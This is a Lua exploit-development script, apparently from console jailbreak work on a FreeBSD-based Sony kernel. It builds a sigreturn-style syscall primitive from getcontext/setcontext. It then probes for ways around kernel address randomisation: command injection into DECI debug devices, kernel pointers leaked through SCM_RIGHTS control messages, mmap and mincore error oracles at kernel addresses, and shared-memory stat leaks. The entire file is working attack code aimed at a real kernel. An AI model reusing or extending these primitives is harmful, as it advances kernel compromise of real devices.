-- CRASH_CLASS: LOW
-- PROBE 139a: DECI command injection + mmap KASLR oracle + sendmsg cmsg
--
-- Novel KASLR approaches after all standard vectors blocked:
-- A: Write to deci_stdin (inject debug commands)
-- B: DECI ttya0 write/read (command channel)
-- C: sendmsg/recvmsg with SCM_RIGHTS (kernel cmsg buffer pointers)
-- D: mmap at kernel-adjacent addresses (error code oracle)
-- E: Shared memory via SROP (might create kernel-mapped objects)

print("=== PROBE 139a: DECI CMD + MMAP ORACLE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- A: DECI stdin write (command injection)
--------------------------------------------------------------------
print("")
print("--- [A] DECI stdin write ---")
ws(gpu + 0x100, "/dev/deci_stdin")
-- Try O_RDWR first, then O_WRONLY
local fd_sin = -1
for _, fl in ipairs({0x2006, 0x2005, 0x0006, 0x0005, 0x0002, 0x0001}) do
    local rv = srop(5, ua(gpu + 0x100), uint64(fl))
    local fh, fl2 = get_hi_lo(rv)
    if fl2 > 0 and fl2 < 256 and fh == 0 then
        fd_sin = fl2
        print("[A] deci_stdin opened fd=" .. fd_sin .. " flags=" .. string.format("0x%X", fl))
        break
    end
end

if fd_sin > 0 then
    -- Try writing a DECI protocol command
    local wbuf = gpu + 0x200
    -- DECI protocol: simple version query
    ws(wbuf, "version\n")
    local rv_w = srop(4, uint64(fd_sin), ua(wbuf), uint64(8))
    print("[A] deci_stdin write(version)=" .. hex(rv_w))

    -- Try binary DECI header: magic=0x44454349 (DECI), then cmd
    zero(wbuf, 0x40)
    memory.write_dword(wbuf + 0, 0x44454349) -- "DECI"
    memory.write_dword(wbuf + 4, 0x00000001) -- cmd 1
    memory.write_dword(wbuf + 8, 0x00000010) -- length
    rv_w = srop(4, uint64(fd_sin), ua(wbuf), uint64(16))
    print("[A] deci_stdin write(DECI_header)=" .. hex(rv_w))

    srop(6, uint64(fd_sin))
else
    print("[A] deci_stdin write OPEN FAIL (stdin is read-only)")
end

-- Try deci_ttya0 read with O_NONBLOCK
ws(gpu + 0x100, "/dev/deci_ttya0")
local fd_ttya = srop(5, ua(gpu + 0x100), uint64(0x2004))
local tah, tal = get_hi_lo(fd_ttya)
if tal > 0 and tal < 256 and tah == 0 then
    print("[A] deci_ttya0 fd=" .. tal)
    -- Write a command
    ws(gpu + 0x200, "version\r\n")
    local rv_w = srop(4, uint64(tal), ua(gpu + 0x200), uint64(10))
    print("[A] ttya0 write=" .. hex(rv_w))
    -- Read response
    zero(gpu + 0x300, 0x200)
    local rv_r = srop(3, uint64(tal), ua(gpu + 0x300), uint64(0x200))
    local rrh, rrl = get_hi_lo(rv_r)
    if rrl > 0 and rrl < 0x200 and rrh == 0 then
        print("[A] *** ttya0 read " .. rrl .. " bytes! ***")
        local s = ""
        for i = 0, math.min(rrl, 64) - 1 do
            s = s .. string.format("%02X ", to_num(memory.read_byte(gpu + 0x300 + i)))
        end
        print("[A] " .. s)
    else
        print("[A] ttya0 read=" .. hex(rv_r))
    end
    srop(6, uint64(tal))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: sendmsg/recvmsg with cmsg (SCM_RIGHTS fd passing)
--------------------------------------------------------------------
print("")
print("--- [B] sendmsg+cmsg ---")

-- Create a socketpair: sys 135 = socketpair(AF_LOCAL, SOCK_STREAM, 0, sv[2])
local sv_buf = gpu + 0x100
zero(sv_buf, 0x10)
local rv_sp = srop(135, uint64(1), uint64(1), uint64(0), ua(sv_buf))
local sph, spl = get_hi_lo(rv_sp)
print("[B] socketpair=" .. hex(rv_sp))
local sv0 = to_num(memory.read_dword(sv_buf))
local sv1 = to_num(memory.read_dword(sv_buf + 4))
print("[B] sv=" .. sv0 .. "," .. sv1)

if sv0 > 0 and sv0 < 256 and sv1 > 0 and sv1 < 256 then
    -- Build sendmsg with SCM_RIGHTS to pass a fd
    -- struct msghdr:
    --   msg_name(8), msg_namelen(4), pad(4)
    --   msg_iov(8), msg_iovlen(4), pad(4)
    --   msg_control(8), msg_controllen(4), pad(4)
    --   msg_flags(4)
    local msg = gpu + 0x200
    local iov = gpu + 0x300
    local cmsg_buf = gpu + 0x400
    local data_buf = gpu + 0x500

    -- Data to send
    ws(data_buf, "X")

    -- iov
    zero(iov, 0x20)
    memory.write_qword(iov, ua(data_buf))     -- iov_base
    memory.write_qword(iov + 8, uint64(1))    -- iov_len

    -- cmsg: SCM_RIGHTS, pass fd sv0
    zero(cmsg_buf, 0x40)
    -- cmsg_len = CMSG_LEN(sizeof(int)) = 16 + 4 = 20 (or 24 with alignment)
    memory.write_qword(cmsg_buf, uint64(20))       -- cmsg_len
    memory.write_dword(cmsg_buf + 8, 0xFFFF)       -- cmsg_level = SOL_SOCKET
    memory.write_dword(cmsg_buf + 12, 1)           -- cmsg_type = SCM_RIGHTS
    memory.write_dword(cmsg_buf + 16, sv0)         -- the fd to pass

    -- msghdr
    zero(msg, 0x40)
    memory.write_qword(msg + 0, uint64(0))          -- msg_name = NULL
    memory.write_dword(msg + 8, 0)                   -- msg_namelen
    memory.write_qword(msg + 0x10, ua(iov))         -- msg_iov
    memory.write_dword(msg + 0x18, 1)               -- msg_iovlen
    memory.write_qword(msg + 0x20, ua(cmsg_buf))    -- msg_control
    memory.write_dword(msg + 0x28, 24)              -- msg_controllen

    -- sendmsg(sv1, msg, 0)
    local rv_sm = srop(28, uint64(sv1), ua(msg), uint64(0))
    print("[B] sendmsg=" .. hex(rv_sm))

    -- Now recvmsg on sv0 to get the cmsg with potentially kernel info
    local recv_cmsg = gpu + 0x600
    local recv_data = gpu + 0x700
    local recv_iov = gpu + 0x780
    local recv_msg = gpu + 0x800

    zero(recv_data, 0x20)
    zero(recv_iov, 0x20)
    memory.write_qword(recv_iov, ua(recv_data))
    memory.write_qword(recv_iov + 8, uint64(0x10))

    zero(recv_cmsg, 0x100)
    zero(recv_msg, 0x40)
    memory.write_qword(recv_msg + 0x10, ua(recv_iov))
    memory.write_dword(recv_msg + 0x18, 1)
    memory.write_qword(recv_msg + 0x20, ua(recv_cmsg))
    memory.write_dword(recv_msg + 0x28, 0x100)

    -- recvmsg(sv0, msg, 0)
    local rv_rm = srop(27, uint64(sv0), ua(recv_msg), uint64(0))
    print("[B] recvmsg=" .. hex(rv_rm))

    -- Check cmsg buffer for kernel pointers
    local clen = to_num(memory.read_dword(recv_cmsg))
    print("[B] cmsg_len=" .. clen)
    print("[B] cmsg dump:")
    for off = 0, 0x40, 8 do
        local v = safe_rq(recv_cmsg + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("  cmsg+0x%02X: %s", off, hex(v)))
            end
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("  *** KERNEL POINTER! ***")
            end
        end
    end

    -- Check msg_flags
    local mflags = to_num(memory.read_dword(recv_msg + 0x30))
    print("[B] msg_flags=" .. string.format("0x%X", mflags))

    -- Check controllen returned
    local retlen = to_num(memory.read_dword(recv_msg + 0x28))
    print("[B] returned controllen=" .. retlen)

    srop(6, uint64(sv0))
    srop(6, uint64(sv1))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: mmap KASLR oracle
-- Try mmap(MAP_FIXED) at kernel-range addresses to see if error differs
--------------------------------------------------------------------
print("")
print("--- [C] mmap oracle ---")
-- On FreeBSD, kernel is at ~0xFFFFFFFF80000000 with KASLR
-- Try MAP_FIXED mmap at various kernel-adjacent addresses
-- sys 477 = Sony mmap variant

-- First establish baseline: mmap at known-bad userland address
local function try_mmap_fixed(addr_str)
    local rv = srop(477, uint64(addr_str), uint64(0x4000), uint64(3),
        uint64(0x1012), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    return rv
end

-- Userland baseline (should work or fail predictably)
local rv_base = try_mmap_fixed("0x0000000400000000")
print("[C] baseline(user_va)=" .. hex(rv_base))

-- Try kernel-range addresses
local kernel_addrs = {
    "0xFFFF800000000000",
    "0xFFFF800100000000",
    "0xFFFF800200000000",
    "0xFFFFFF8000000000",
    "0xFFFFFF8100000000",
    "0xFFFFFFFF80000000",
    "0xFFFFFFFF80200000",
    "0xFFFFFFFF80400000",
    "0xFFFFFFFF81000000",
    "0xFFFFFFFF82000000",
    "0xFFFFFFFF84000000",
    "0xFFFFFFFF88000000",
    "0xFFFFFFFF90000000",
    "0xFFFFFFFFA0000000",
    "0xFFFFFFFFC0000000",
}
for _, addr in ipairs(kernel_addrs) do
    local rv = try_mmap_fixed(addr)
    print(string.format("[C] mmap(%s)=%s", addr, hex(rv)))
end

-- Also try mincore(78) at kernel addresses
-- mincore returns whether pages are in memory; error for kernel VA
-- might differ for mapped vs unmapped kernel pages
print("[C] mincore probes:")
local mc_buf = gpu + 0xA000
for _, addr in ipairs({"0xFFFFFFFF80000000", "0xFFFFFFFF80200000", "0xFFFFFFFF82000000"}) do
    zero(mc_buf, 0x10)
    local rv = srop(78, uint64(addr), uint64(0x4000), ua(mc_buf))
    print(string.format("[C] mincore(%s)=%s", addr, hex(rv)))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: shm_open(482) — shared memory might create kernel objects w/ptrs
--------------------------------------------------------------------
print("")
print("--- [D] shm_open ---")
ws(gpu + 0x100, "/test_shm")
-- shm_open(path, O_RDWR|O_CREAT, mode)
local rv_shm = srop(482, ua(gpu + 0x100), uint64(0x0202), uint64(0x1FF))
local smh, sml = get_hi_lo(rv_shm)
print("[D] shm_open=" .. hex(rv_shm))
if sml > 0 and sml < 256 and smh == 0 then
    print("[D] *** SHM OPENED fd=" .. sml .. " ***")
    -- ftruncate to set size
    srop(480, uint64(sml), uint64(0x4000))
    -- mmap the shared memory
    local shm_map = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(0x0001), uint64(sml), uint64(0))
    print("[D] shm mmap=" .. hex(shm_map))
    -- fstat
    zero(gpu + 0x300, 0x100)
    srop(189, uint64(sml), ua(gpu + 0x300))
    for off = 0, 0x78, 8 do
        local v = safe_rq(gpu + 0x300 + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[D] *** KPTR shm_stat+0x%02X: %s ***", off, hex(v)))
            end
        end
    end
    srop(6, uint64(sml))
end
print("[D] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
